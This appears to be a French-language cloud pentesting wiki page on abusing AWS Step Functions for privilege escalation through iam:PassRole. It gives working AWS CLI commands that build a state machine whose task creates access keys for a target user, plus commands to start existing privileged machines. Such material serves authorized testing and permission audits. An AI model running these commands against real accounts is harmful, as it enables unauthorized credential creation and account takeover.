---
title: "Step Functions : orchestrer des actions privilégiées via une machine à états"
order: 5
description: "Détourner les machines à états Step Functions et leur rôle d'exécution pour orchestrer des actions privilégiées."
keywords:
  - Step Functions
  - machine à états
  - rôle d'exécution
  - orchestration
  - workflow
---

# Step Functions

Une **machine à états (state machine)** Step Functions s'exécute avec un rôle d'exécution et peut appeler directement des actions de service AWS depuis sa définition. Avec `states:CreateStateMachine` (plus `iam:PassRole`), un attaquant définit une machine dont les états `Task` exécutent des actions privilégiées en tant que rôle transmis ; avec `states:UpdateStateMachine`, une machine existante est détournée ; et `states:StartExecution` sur une machine qui porte déjà un rôle puissant exécute son workflow sans aucune modification.

## Créer une machine qui agit en tant que rôle transmis

```bash
cat > def.json <<'JSON'
{ "StartAt":"go","States":{
  "go":{"Type":"Task","Resource":"arn:aws:states:::aws-sdk:iam:createAccessKey",
        "Parameters":{"UserName":"target"},"End":true}}}
JSON
aws stepfunctions create-state-machine --name x \
  --role-arn arn:aws:iam::<acct>:role/<privileged-role> \
  --definition file://def.json
aws stepfunctions start-execution --state-machine-arn <arn>
```

## Piloter une machine existante

```bash
aws stepfunctions list-state-machines
aws stepfunctions describe-state-machine --state-machine-arn <arn> --query roleArn
aws stepfunctions start-execution --state-machine-arn <arn> --input '{}'
```

## Notes d'exploitation

- L'intégration SDK (`arn:aws:states:::aws-sdk:<service>:<action>`) permet à une machine à états d'appeler presque n'importe quelle API AWS en tant que son rôle, de sorte que les permissions du rôle définissent le rayon d'impact.
- `create-state-machine` avec `--role-arn` nécessite `iam:PassRole`, ce qui en fait un chemin d'élévation de privilèges par PassRole propre à Step Functions ; l'article côté identité est [pass-role/step-functions](../identity/privilege-escalation/pass-role/step-functions.md).
- Une machine qui porte déjà un rôle étendu est exploitable avec le seul `start-execution`.

## Outils

- **AWS CLI** (`stepfunctions create-state-machine`, `start-execution`, `list-state-machines`).

## Références

- [AWS : intégrations de service AWS SDK pour Step Functions](https://docs.aws.amazon.com/step-functions/latest/dg/supported-services-awssdk.html)
- [HackTricks Cloud : AWS Step Functions](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/index.html)
- [Hacking the Cloud : AWS](https://hackingthe.cloud/)
- [Rhino Security Labs : élévation de privilèges AWS](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [Stratus Red Team : techniques AWS](https://stratus-red-team.cloud/attack-techniques/AWS/)
